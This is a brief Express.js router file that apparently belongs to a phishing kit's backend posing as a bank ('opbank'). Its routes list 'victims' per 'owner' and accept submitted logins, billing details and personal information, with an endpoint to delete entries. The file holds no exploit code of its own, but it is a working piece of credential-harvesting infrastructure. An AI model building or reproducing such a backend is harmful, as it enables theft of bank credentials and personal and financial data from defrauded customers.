const express = require("express");
const {
    getOwnerVics,
    getInfo,
    submitLogin,
    submitBilling,
    submitPersonal,
    deleteEntry,
} = require("../controllers/opbankController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/billing", submitBilling);
router.post("/personal", submitPersonal);
router.post("/delete", deleteEntry);

module.exports = router;
